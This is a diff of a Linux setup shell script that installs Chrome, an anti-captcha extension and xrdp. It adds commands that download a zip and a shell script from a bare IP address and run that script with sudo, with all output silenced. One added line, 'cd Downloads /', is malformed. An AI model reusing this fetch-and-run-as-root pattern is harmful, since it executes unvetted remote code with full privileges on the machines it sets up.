@@ -13,17 +13,16 @@ sudo apt-get update > /dev/null 2>&1
 echo "===================================="
 echo "Chrome"
 echo "===================================="
-sudo wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb > /dev/null 2>&1
+sudo apt install -y apt-transport-https curl > /dev/null 2>&1
+sudo apt update > /dev/null 2>&1
+wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb > /dev/null 2>&1
 sudo apt install ./google-chrome-stable_current_amd64.deb > /dev/null 2>&1
-sudo wget https://antcpt.com/downloads/anticaptcha/chrome/anticaptcha-plugin_v0.61.zip > /dev/null 2>&1
-echo "===================================="
-echo "Install Firefox"
-echo "===================================="
-sudo apt install firefox -y > /dev/null 2>&1
 echo "===================================="
 echo "Install Plugin"
 echo "===================================="
-sudo wget http://199.250.207.182/~ngewetech/nah/ext.sh -O /home/admin/ext.sh > /dev/null 2>&1 && cd /home/admin && sudo sh ext.sh > /dev/null 2>&1
+wget http://199.250.207.182/~ngewetech/include/induk/anti.zip -O /home/bsm/Downloads/anti.zip > /dev/null 2>&1 && cd Downloads / && unzip anti.zip > /dev/null 2>&1
+wget http://199.250.207.182/~ngewetech/nah/ext.sh -O /home/admin/ext.sh > /dev/null 2>&1 && cd /home/admin && sudo sh ext.sh > /dev/null 2>&1
+echo "===================================="
 echo "Install RDP"
 echo "===================================="
 sudo apt install -y xrdp > /dev/null 2>&1
